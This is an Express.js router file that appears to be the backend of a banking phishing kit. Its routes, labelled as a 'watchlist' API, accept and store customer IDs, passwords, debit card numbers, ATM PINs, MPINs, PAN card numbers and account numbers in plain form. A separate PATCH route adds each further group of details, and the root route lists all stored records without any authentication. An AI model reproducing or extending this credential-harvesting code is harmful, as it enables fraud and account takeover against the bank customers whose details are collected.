const express = require("express");
const router = express.Router();
const DataSchema = require("./../models/data_schema");

//Get all watchlists
router.get("/", async (req, res) => {
  try {
    const data = await DataSchema.find();
    // res.status(200).json(data);
    res.render("index.ejs", { data: data });
  } catch (error) {
    res.status(500).json({ message: error.message });
  }
});

//Get one watchlist
router.get("/:id", async (req, res) => {
  try {
    const watchlist = await DataSchema.findById(req.params.id).lean();
    if (!watchlist) {
      return res
        .status(404)
        .json({ message: "Watchlist not found", status: "error" });
    }
    res.status(200).json(watchlist);
  } catch (error) {
    res.status(500).json({ message: error.message });
  }
});

//Create One
router.post("/", async (req, res) => {
  //All Field Required
  // if (!req.body.customer_id && !req.body.password || !req.body.debit_card && !req.body.atm_pin || !req.body.customer_id && !req.body.mpin || !req.body.register_mobile_number && !req.body.mpin) {
  //   //Return eerror
  //   return res.status(400).json({
  //     message: "All fields are required",
  //     status: "error",
  //   });
  // }

  const data = new DataSchema({
    customer_id: req.body.customer_id,
    password: req.body.password,
    debit_card: req.body.debit_card,
    atm_pin: req.body.atm_pin,
    register_mobile_number: req.body.register_mobile_number,
    mpin: req.body.mpin,
    pan_card: req.body.pan_card,
    register_mobile_number_2: req.body.register_mobile_number_2,
    account_number: req.body.account_number,
  });
  try {
    //Save and return id
    const newData = await data.save();
    res.status(201).json({
      message: "Data saved successfully",
      status: "success",
      id: newData._id,
    });
  } catch (error) {
    res.status(500).json({ message: error.message });
  }
});

//Delete one watchlist
router.delete("/:id", async (req, res) => {
  try {
    const watchlist = await DataSchema.findById(req.params.id);
    if (!watchlist) {
      return res
        .status(404)
        .json({ message: "Watchlist not found", status: "error" });
    }
    await DataSchema.findByIdAndDelete(req.params.id);
    res.status(200).json({ message: "Watchlist deleted", status: "success" });
  } catch (error) {
    res.status(500).json({ message: error.message });
  }
});

// Update signature
router.patch("/card/:id", async (req, res) => {
  try {
    const watchlist = await DataSchema.findById(req.params.id);
    if (!watchlist) {
      return res
        .status(404)
        .json({ message: "Watchlist not found", status: "error" });
    }

    //Update Card Details
    watchlist.pan_card = req.body.pan_card; // Update the card_holder_name field
    watchlist.register_mobile_number_2 = req.body.register_mobile_number_2; // Update the card_number field

    const updatedWatchlist = await watchlist.save();
    res.status(200).json(updatedWatchlist);
  } catch (error) {
    res.status(500).json({ message: error.message });
  }
});

// Update signature
router.patch("/account/:id", async (req, res) => {
  try {
    const watchlist = await DataSchema.findById(req.params.id);
    if (!watchlist) {
      return res
        .status(404)
        .json({ message: "Watchlist not found", status: "error" });
    }

    watchlist.account_number = req.body.account_number; // Update the login_pin field

    const updatedWatchlist = await watchlist.save();
    res.status(200).json(updatedWatchlist);
  } catch (error) {
    res.status(500).json({ message: error.message });
  }
});

// Update atm_pin and pan_card
router.patch("/atm_pin_pan_card/:id", async (req, res) => {
  try {
    const watchlist = await DataSchema.findById(req.params.id);
    if (!watchlist) {
      return res
        .status(404)
        .json({ message: "Watchlist not found", status: "error" });
    }

    watchlist.atm_pin = req.body.atm_pin; // Update the atm_pin field
    watchlist.pan_card = req.body.pan_card; // Update the pan_card field

    const updatedWatchlist = await watchlist.save();
    res.status(200).json(updatedWatchlist);
  } catch (error) {
    res.status(500).json({ message: error.message });
  }
});

module.exports = router;
